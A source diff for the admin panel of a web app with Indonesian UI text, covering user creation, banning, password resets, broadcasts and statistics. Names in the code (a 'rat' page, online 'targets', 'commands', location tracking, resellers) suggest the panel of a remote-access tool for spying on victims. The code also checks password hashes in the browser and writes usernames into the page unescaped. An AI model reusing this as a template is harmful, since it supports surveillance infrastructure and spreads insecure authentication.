+  if(arr.length===0){ $("#panel-grid").innerHTML='<div style="text-align:center;color:var(--text-mute);font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>'; return; }
+  $("#panel-grid").innerHTML = arr.map(([ic,txt])=>`<div class="panel-action" data-action="${txt}"><div class="ico-badge"><i class="fa-solid ${ic}"></i></div><div class="txt">${txt}</div></div>`).join("");
   $$(".panel-action").forEach(el=>el.onclick=()=>openPanelAction(el.dataset.action));
 }
 
 function openPanelAction(action){
   const box = $("#modal-box");
   const forms = {
-    "Add User": `
-      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-usn" placeholder="username"></div></div>
-      <div class="field"><label>Password</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="f-pw" placeholder="min 6 karakter"></div></div>
-      <div class="field"><label>Role</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user-tag"></i></div><select id="f-role"><option value="member">Member</option><option value="reseller">Reseller</option></select></div></div>
-      <div class="field"><label>Masa Aktif</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-clock"></i></div><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Akun</button>`,
-    "Add Member": `
-      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-usn" placeholder="username"></div></div>
-      <div class="field"><label>Password</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="f-pw" placeholder="min 6 karakter"></div></div>
-      <div class="field"><label>Masa Aktif</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-clock"></i></div><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Member</button>`,
-    "Manage User": `
-      <div class="field"><label>Cari User</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-search"></i></div><input id="f-search" placeholder="username..."></div></div>
-      <div id="user-list" style="max-height:50vh;overflow-y:auto"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
-    "Manage Member": `
-      <div class="field"><label>Cari Member</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-search"></i></div><input id="f-search" placeholder="username..."></div></div>
-      <div id="user-list" style="max-height:50vh;overflow-y:auto"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
-    "Ban User": `
-      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-ban-usn" placeholder="username"></div></div>
-      <button class="btn btn-danger" id="btn-submit-action"><i class="fa-solid fa-ban"></i> Ban</button>`,
-    "Reset Password": `
-      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-reset-usn" placeholder="username"></div></div>
-      <div class="field"><label>Password Baru</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="f-reset-pw" placeholder="min 6 karakter"></div></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-key"></i> Reset</button>`,
-    "Broadcast": `
-      <div class="field"><label>Judul</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-heading"></i></div><input id="f-bc-title" placeholder="Judul"></div></div>
-      <div class="field"><label>Pesan</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-message"></i></div><textarea id="f-bc-msg" placeholder="Tulis pengumuman..."></textarea></div></div>
-      <div class="field"><label>Gambar URL (opsional)</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-image"></i></div><input id="f-bc-img" placeholder="https://..."></div></div>
-      <div class="field"><label>Link URL (opsional)</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input id="f-bc-url" placeholder="https://..."></div></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-bullhorn"></i> Kirim</button>`,
+    "Add User": `<div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div><div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div><div class="field"><label>Role</label><select id="f-role"><option value="member">Member</option><option value="vip">VIP</option><option value="reseller">Reseller</option></select></div><div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div><button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Akun</button>`,
+    "Add Member": `<div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div><div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div><div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div><button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat</button>`,
+    "Manage User": `<div class="field"><label>Cari</label><input id="f-search" placeholder="username..."></div><div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
+    "Manage Member": `<div class="field"><label>Cari</label><input id="f-search" placeholder="username..."></div><div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
+    "Ban User": `<div class="field"><label>Username</label><input id="f-ban-usn" placeholder="username"></div><button class="btn btn-danger" id="btn-submit-action"><i class="fa-solid fa-ban"></i> Ban</button>`,
+    "Reset Password": `<div class="field"><label>Username</label><input id="f-reset-usn" placeholder="username"></div><div class="field"><label>Password Baru</label><input type="password" id="f-reset-pw"></div><button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-key"></i> Reset</button>`,
+    "Broadcast": `<div class="field"><label>Judul</label><input id="f-bc-title"></div><div class="field"><label>Pesan</label><textarea id="f-bc-msg"></textarea></div><div class="field"><label>Gambar URL (opsional)</label><input id="f-bc-img" placeholder="https://..."></div><div class="field"><label>Link URL (opsional)</label><input id="f-bc-url" placeholder="https://..."></div><button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-bullhorn"></i> Kirim</button>`,
     "Statistics": `<div id="stat-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
     "Database": `<div id="db-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
-    "Extend Member": `
-      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-ext-usn" placeholder="username"></div></div>
-      <div class="field"><label>Tambah Hari</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-clock"></i></div><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-clock-rotate-left"></i> Perpanjang</button>`
+    "Extend Member": `<div class="field"><label>Username</label><input id="f-ext-usn"></div><div class="field"><label>Tambah Hari</label><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div><button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-clock-rotate-left"></i> Perpanjang</button>`
   };
-  box.innerHTML = `<h3>${action}</h3>` + (forms[action] || '<div class="sub">Coming soon.</div>') + `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  box.innerHTML = `<h3>${action}</h3>` + (forms[action]||'<div class="sub">Coming soon.</div>') + `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
   $("#modal").classList.add("show");
-
   const btn = $("#btn-submit-action");
-  if(action === "Add User" || action === "Add Member"){
+  if(action==="Add User"||action==="Add Member"){
     btn.onclick = async ()=>{
-      const usn = $("#f-usn").value.trim();
-      const pw = $("#f-pw").value;
-      const role = action === "Add Member" ? "member" : ($("#f-role")?.value || "member");
+      const usn=$("#f-usn").value.trim(), pw=$("#f-pw").value;
+      const role = action==="Add Member"?"member":($("#f-role")?.value||"member");
       const days = $("#f-days").value;
-      if(!usn || !pw) return toast("Isi username & password","err");
-      if(pw.length < 6) return toast("Password min 6 karakter","err");
+      if(!usn||!pw) return toast("Isi semua","err");
+      if(pw.length<6) return toast("Password min 6","err");
       try{
-        const usersSnap = await get(ref(db, "users"));
-        const users = usersSnap.exists() ? usersSnap.val() : {};
-        for(const uid in users){ if(users[uid].username === usn) return toast("Username udah dipake","err"); }
-        const salt = genSalt();
-        const hash = await sha256(pw + salt);
+        const usersSnap = await get(ref(db,"users"));
+        const users = usersSnap.exists()?usersSnap.val():{};
+        for(const uid in users){ if(users[uid].username===usn) return toast("Username udah dipake","err"); }
+        const salt = genSalt(); const hash = await sha256(pw+salt);
         const userCode = genUserCode();
-        const newRef = push(ref(db, "users"));
-        await set(newRef, {
-          username: usn, passwordHash: hash, passwordSalt: salt,
-          role, userCode, createdBy: State.uid, createdAt: Date.now(),
-          expiresAt: days ? Date.now() + parseInt(days)*86400000 : null,
-          banned: false, avatar: ""
-        });
+        const newRef = push(ref(db,"users"));
+        await set(newRef,{username:usn,passwordHash:hash,passwordSalt:salt,role,userCode,createdBy:State.uid,createdAt:Date.now(),expiresAt:days?Date.now()+parseInt(days)*86400000:null,banned:false,avatar:""});
         toast(`Akun ${usn} dibuat. Code: ${userCode}`,"ok",6000);
         closeModal();
       }catch(e){ toast("Gagal: "+e.message,"err"); }
     };
   }
-  if(action === "Ban User"){
-    btn.onclick = async ()=>{
-      const usn = $("#f-ban-usn").value.trim();
-      if(!usn) return toast("Isi username","err");
-      const usersSnap = await get(ref(db, "users"));
-      const users = usersSnap.exists() ? usersSnap.val() : {};
-      for(const uid in users){
-        if(users[uid].username === usn){
-          await update(ref(db, "users/"+uid), {banned: true});
-          toast(`User ${usn} di-ban`,"ok"); closeModal(); return;
-        }
-      }
-      toast("User gak ditemukan","err");
-    };
-  }
-  if(action === "Reset Password"){
-    btn.onclick = async ()=>{
-      const usn = $("#f-reset-usn").value.trim();
-      const pw = $("#f-reset-pw").value;
-      if(!usn || !pw) return toast("Isi semua","err");
-      if(pw.length < 6) return toast("Min 6 karakter","err");
-      const usersSnap = await get(ref(db, "users"));
-      const users = usersSnap.exists() ? usersSnap.val() : {};
-      for(const uid in users){
-        if(users[uid].username === usn){
-          const salt = genSalt();
-          const hash = await sha256(pw + salt);
-          await update(ref(db, "users/"+uid), {passwordHash: hash, passwordSalt: salt});
-          toast(`Password ${usn} direset`,"ok"); closeModal(); return;
-        }
-      }
-      toast("User gak ditemukan","err");
-    };
-  }
-  if(action === "Extend Member"){
-    btn.onclick = async ()=>{
-      const usn = $("#f-ext-usn").value.trim();
-      const days = parseInt($("#f-ext-days").value);
-      if(!usn) return toast("Isi username","err");
-      const usersSnap = await get(ref(db, "users"));
-      const users = usersSnap.exists() ? usersSnap.val() : {};
-      for(const uid in users){
-        if(users[uid].username === usn){
-          const base = users[uid].expiresAt && users[uid].expiresAt > Date.now() ? users[uid].expiresAt : Date.now();
-          await update(ref(db, "users/"+uid), {expiresAt: base + days*86400000});
-          toast(`+${days} hari buat ${usn}`,"ok"); closeModal(); return;
-        }
-      }
-      toast("User gak ditemukan","err");
-    };
-  }
-  if(action === "Broadcast"){
-    btn.onclick = async ()=>{
-      const title = $("#f-bc-title").value.trim();
-      const msg = $("#f-bc-msg").value.trim();
-      const img = $("#f-bc-img").value.trim();
-      const url = $("#f-bc-url").value.trim();
-      if(!msg) return toast("Isi pesan","err");
-      const bRef = push(ref(db, "broadcasts"));
-      await set(bRef, {title, message: msg, image: img, url, fromUid: State.uid, createdAt: Date.now()});
-      toast("Broadcast terkirim","ok"); closeModal();
-    };
-  }
-  if(action === "Manage User" || action === "Manage Member"){
-    const s = $("#f-search");
-    s.oninput = ()=>{ clearTimeout(window._st); window._st = setTimeout(()=>searchUsersPanel(s.value, action),400); };
-  }
-  if(action === "Statistics") loadStatistics();
-  if(action === "Database") loadDatabase();
+  if(action==="Ban User"){ btn.onclick = async ()=>{ const usn=$("#f-ban-usn").value.trim(); if(!usn)return toast("Isi username","err"); const s=await get(ref(db,"users")); const u=s.val()||{}; for(const uid in u){ if(u[uid].username===usn){ await update(ref(db,"users/"+uid),{banned:true}); toast(`User ${usn} di-ban`,"ok"); closeModal(); return; } } toast("Gak ada","err"); }; }
+  if(action==="Reset Password"){ btn.onclick = async ()=>{ const usn=$("#f-reset-usn").value.trim(), pw=$("#f-reset-pw").value; if(!usn||!pw)return toast("Isi semua","err"); if(pw.length<6)return toast("Min 6","err"); const s=await get(ref(db,"users")); const u=s.val()||{}; for(const uid in u){ if(u[uid].username===usn){ const salt=genSalt(); const hash=await sha256(pw+salt); await update(ref(db,"users/"+uid),{passwordHash:hash,passwordSalt:salt}); toast("Direset","ok"); closeModal(); return; } } toast("Gak ada","err"); }; }
+  if(action==="Extend Member"){ btn.onclick = async ()=>{ const usn=$("#f-ext-usn").value.trim(); const days=parseInt($("#f-ext-days").value); if(!usn)return toast("Isi","err"); const s=await get(ref(db,"users")); const u=s.val()||{}; for(const uid in u){ if(u[uid].username===usn){ const base = u[uid].expiresAt && u[uid].expiresAt>Date.now()?u[uid].expiresAt:Date.now(); await update(ref(db,"users/"+uid),{expiresAt:base+days*86400000}); toast(`+${days} hari`,"ok"); closeModal(); return; } } toast("Gak ada","err"); }; }
+  if(action==="Broadcast"){ btn.onclick = async ()=>{ const title=$("#f-bc-title").value.trim(),msg=$("#f-bc-msg").value.trim(),img=$("#f-bc-img").value.trim(),url=$("#f-bc-url").value.trim(); if(!msg)return toast("Isi pesan","err"); const bRef=push(ref(db,"broadcasts")); await set(bRef,{title,message:msg,image:img,url,fromUid:State.uid,createdAt:Date.now()}); toast("Terkirim","ok"); closeModal(); }; }
+  if(action==="Manage User"||action==="Manage Member"){ const s=$("#f-search"); s.oninput = ()=>{ clearTimeout(window._st); window._st=setTimeout(()=>searchUsers(s.value,action),400); }; }
+  if(action==="Statistics") loadStats();
+  if(action==="Database") loadDB();
 }
 
-async function searchUsersPanel(q, action){
-  const list = $("#user-list");
-  if(!q){ list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div>'; return; }
+async function searchUsers(q, action){
+  const list = $("#user-list"); if(!q){ list.innerHTML='<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div>'; return; }
   try{
-    const snap = await get(ref(db, "users"));
-    const users = snap.exists() ? snap.val() : {};
+    const snap = await get(ref(db,"users"));
+    const users = snap.exists()?snap.val():{};
     const results = [];
-    for(const uid in users){
-      const u = users[uid];
-      if(u.username.toLowerCase().includes(q.toLowerCase())){
-        if(action === "Manage Member" && u.role !== "member") continue;
-        results.push({uid, ...u});
-      }
-    }
-    if(results.length === 0){ list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Gak ditemukan</div>'; return; }
-    list.innerHTML = results.map(u=>`
-      <div class="list-item" style="margin-bottom:8px;cursor:default">
-        <div class="ico-badge"><i class="fa-solid fa-user"></i></div>
-        <div class="txt"><div class="n">${u.username}</div><div class="d">${u.role} · ${u.banned?"banned":"active"} · ${u.userCode||"—"}</div></div>
-      </div>
-    `).join("");
-  }catch(e){ list.innerHTML = '<div style="text-align:center;color:var(--error);font-size:12px;padding:20px">Error</div>'; }
+    for(const uid in users){ const u=users[uid]; if(u.username.toLowerCase().includes(q.toLowerCase())){ if(action==="Manage Member" && u.role!=="member")continue; results.push({uid,...u}); } }
+    if(results.length===0){ list.innerHTML='<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Gak ditemukan</div>'; return; }
+    list.innerHTML = results.map(u=>`<div class="list-item" style="margin-bottom:8px;cursor:default"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><div class="txt"><div class="n">${u.username}</div><div class="d">${u.role} · ${u.banned?"banned":"active"} · ${u.userCode||"—"}</div></div></div>`).join("");
+  }catch(e){}
 }
-
-async function loadStatistics(){
+async function loadStats(){
   const box = $("#stat-content");
   try{
-    const users = (await get(ref(db, "users"))).val() || {};
-    const targets = (await get(ref(db, "targets"))).val() || {};
-    let totalUsers=0, owners=0, resellers=0, members=0, banned=0;
-    for(const uid in users){
-      totalUsers++;
-      if(users[uid].role === "owner") owners++;
-      if(users[uid].role === "reseller") resellers++;
-      if(users[uid].role === "member") members++;
-      if(users[uid].banned) banned++;
-    }
-    let totalTargets=0, onlineTargets=0;
-    for(const tid in targets){ totalTargets++; if(targets[tid].status === "online") onlineTargets++; }
-    box.innerHTML = `
-      <div class="stat-grid">
-        <div class="stat-card"><div class="l">Total Users</div><div class="v accent">${totalUsers}</div></div>
-        <div class="stat-card"><div class="l">Total Targets</div><div class="v info">${totalTargets}</div></div>
-        <div class="stat-card"><div class="l">Online</div><div class="v success">${onlineTargets}</div></div>
-        <div class="stat-card"><div class="l">Banned</div><div class="v warn">${banned}</div></div>
-        <div class="stat-card"><div class="l">Owners</div><div class="v accent">${owners}</div></div>
-        <div class="stat-card"><div class="l">Resellers</div><div class="v success">${resellers}</div></div>
-        <div class="stat-card"><div class="l">Members</div><div class="v info">${members}</div></div>
-      </div>`;
-  }catch(e){ box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal load</div>'; }
+    const users = (await get(ref(db,"users"))).val()||{};
+    const targets = (await get(ref(db,"targets"))).val()||{};
+    let totalUsers=0,owners=0,resellers=0,members=0,vips=0,banned=0;
+    for(const uid in users){ totalUsers++; if(users[uid].role==="owner")owners++; if(users[uid].role==="reseller")resellers++; if(users[uid].role==="member")members++; if(users[uid].role==="vip")vips++; if(users[uid].banned)banned++; }
+    let tt=0,ot=0; for(const tid in targets){ tt++; if(targets[tid].status==="online")ot++; }
+    box.innerHTML = `<div class="stat-grid"><div class="stat-card"><div class="l">Total Users</div><div class="v accent">${totalUsers}</div></div><div class="stat-card"><div class="l">Targets</div><div class="v info">${tt}</div></div><div class="stat-card"><div class="l">Online</div><div class="v success">${ot}</div></div><div class="stat-card"><div class="l">Banned</div><div class="v warn">${banned}</div></div><div class="stat-card"><div class="l">Owners</div><div class="v accent">${owners}</div></div><div class="stat-card"><div class="l">Resellers</div><div class="v success">${resellers}</div></div><div class="stat-card"><div class="l">VIP</div><div class="v" style="color:var(--vip)">${vips}</div></div><div class="stat-card"><div class="l">Members</div><div class="v info">${members}</div></div></div>`;
+  }catch(e){ box.innerHTML='<div style="color:var(--error);font-size:12px">Gagal</div>'; }
 }
-
-async function loadDatabase(){
+async function loadDB(){
   const box = $("#db-content");
   try{
     const nodes = ["users","targets","commands","logs","broadcasts"];
     const rows = [];
-    for(const n of nodes){
-      try{
-        const snap = await get(ref(db, n));
-        const c = snap.exists() ? Object.keys(snap.val()).length : 0;
-        rows.push(`<div class="list-item" style="margin-bottom:8px;cursor:default"><div class="ico-badge"><i class="fa-solid fa-database"></i></div><div class="txt"><div class="n" style="font-family:'JetBrains Mono',monospace">/${n}</div></div><div style="font-weight:700;color:var(--accent-hover)">${c}</div></div>`);
-      }catch(e){ rows.push(`<div style="font-size:12px;color:var(--error)">Error /${n}</div>`); }
-    }
+    for(const n of nodes){ try{ const s=await get(ref(db,n)); const c=s.exists()?Object.keys(s.val()).length:0; rows.push(`<div class="list-item" style="margin-bottom:8px;cursor:default"><div class="ico-badge"><i class="fa-solid fa-database"></i></div><div class="txt"><div class="n" style="font-family:'JetBrains Mono',monospace">/${n}</div></div><div style="font-weight:700;color:var(--accent-hover)">${c}</div></div>`); }catch(e){} }
     box.innerHTML = rows.join("");
-  }catch(e){ box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal load</div>'; }
+  }catch(e){}
 }
 
-// ============================================================
-// SETTINGS / LOGOUT
-// ============================================================
 function openSettings(){
   const box = $("#modal-box");
-  box.innerHTML = `
-    <h3>Settings</h3>
-    <div class="sub">Ubah password</div>
-    <div class="field"><label>Password Lama</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="set-old"></div></div>
-    <div class="field"><label>Password Baru</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="set-new"></div></div>
-    <div class="field"><label>Konfirmasi</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="set-conf"></div></div>
-    <button class="btn btn-primary" id="btn-save-pw"><i class="fa-solid fa-floppy-disk"></i> Save</button>
-    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>`;
+  box.innerHTML = `<h3>Settings</h3><div class="sub">Ubah password</div><div class="field"><label>Password Lama</label><input type="password" id="set-old"></div><div class="field"><label>Password Baru</label><input type="password" id="set-new"></div><div class="field"><label>Konfirmasi</label><input type="password" id="set-conf"></div><button class="btn btn-primary" id="btn-save-pw"><i class="fa-solid fa-floppy-disk"></i> Save</button><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>`;
   $("#modal").classList.add("show");
   $("#btn-save-pw").onclick = async ()=>{
-    const o=$("#set-old").value, n=$("#set-new").value, c=$("#set-conf").value;
-    if(!o||!n) return toast("Isi semua","err");
-    if(n!==c) return toast("Konfirmasi gak cocok","err");
-    if(n.length<6) return toast("Min 6 karakter","err");
-    const oldHash = await sha256(o + State.user.passwordSalt);
-    if(oldHash !== State.user.passwordHash) return toast("Password lama salah","err");
-    const salt = genSalt();
-    const hash = await sha256(n + salt);
-    await update(ref(db, "users/"+State.uid), {passwordHash: hash, passwordSalt: salt});
-    State.user.passwordHash = hash; State.user.passwordSalt = salt;
-    toast("Password diubah","ok"); closeModal();
+    const o=$("#set-old").value,n=$("#set-new").value,c=$("#set-conf").value;
+    if(!o||!n) return toast("Isi","err"); if(n!==c) return toast("Konfirm gak cocok","err"); if(n.length<6) return toast("Min 6","err");
+    const oh = await sha256(o+State.user.passwordSalt); if(oh!==State.user.passwordHash) return toast("Password lama salah","err");
+    const salt=genSalt(); const hash=await sha256(n+salt);
+    await update(ref(db,"users/"+State.uid),{passwordHash:hash,passwordSalt:salt});
+    State.user.passwordHash=hash; State.user.passwordSalt=salt;
+    toast("Diubah","ok"); closeModal();
   };
 }
-
 function doLogout(){
   const box = $("#modal-box");
-  box.innerHTML = `
-    <h3>Log Out</h3>
-    <div class="sub">Yakin mau keluar?</div>
-    <div class="modal-actions">
-      <button class="btn btn-ghost" onclick="closeModal()">Batal</button>
-      <button class="btn btn-primary" onclick="confirmLogout()">Log Out</button>
-    </div>`;
+  box.innerHTML = `<h3>Log Out</h3><div class="sub">Yakin?</div><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Batal</button><button class="btn btn-primary" onclick="confirmLogout()">Log Out</button></div>`;
   $("#modal").classList.add("show");
 }
 function confirmLogout(){
   localStorage.removeItem("bluxus_uid");
-  State.user = null; State.uid = null;
+  State.user=null; State.uid=null;
+  if(State.audio){State.audio.pause();State.audio=null;}
   if(State.unsubLive) State.unsubLive();
   if(State.unsubLoc) State.unsubLoc();
-  closeModal();
-  showScreen("login");
-  $("#login-usn").value = ""; $("#login-pw").value = "";
+  closeModal(); showScreen("login"); $("#login-usn").value=""; $("#login-pw").value="";
 }
 function closeModal(){ $("#modal").classList.remove("show"); }
 
-// ============================================================
-// EVENTS
-// ============================================================
 function bindEvents(){
   $("#btn-login").onclick = doLogin;
-  $("#login-pw").addEventListener("keydown", e=>{ if(e.key === "Enter") doLogin(); });
-  ["","-rat","-tools","-account","-about","-panel"].forEach(suf=>{
-    const b = $("#btn-hamburger" + suf);
-    if(b) b.onclick = openSidebar;
-  });
+  $("#login-pw").addEventListener("keydown",e=>{if(e.key==="Enter")doLogin();});
+  ["","-rat","-tools","-account","-about","-panel"].forEach(suf=>{ const b=$("#btn-hamburger"+suf); if(b)b.onclick=openSidebar; });
   $("#sidebar-backdrop").onclick = closeSidebar;
   $$(".sb-item").forEach(el=>{ el.onclick = ()=>goPage(el.dataset.page); });
   $("#btn-settings").onclick = openSettings;
   $("#btn-logout").onclick = doLogout;
-  $("#btn-change-photo").onclick = ()=>{ toast("Fitur foto profil dalam pengembangan","info"); };
-  $("#modal").addEventListener("click", e=>{ if(e.target.id === "modal") closeModal(); });
-  initUpload();
+  $("#btn-change-photo").onclick = ()=>toast("Fitur dalam pengembangan","info");
+  $("#modal").addEventListener("click",e=>{if(e.target.id==="modal")closeModal();});
+  initPlayer();
 }
 
-// ============================================================
-// INIT
-// ============================================================
 async function init(){
   bindEvents();
   watchConnection();
   const resumed = await tryResume();
   runLoading();
-  if(resumed){ setTimeout(()=>goDashboard(), 2600); }
+  if(resumed){ setTimeout(()=>goDashboard(),2600); }
 }
-
-window.addEventListener("DOMContentLoaded", init);
-window.closeModal = closeModal;
-window.confirmLogout = confirmLogout;
+window.addEventListener("DOMContentLoaded",init);
+window.closeModal=closeModal;
+window.confirmLogout=confirmLogout;
 </script>
 </body>
 </html>
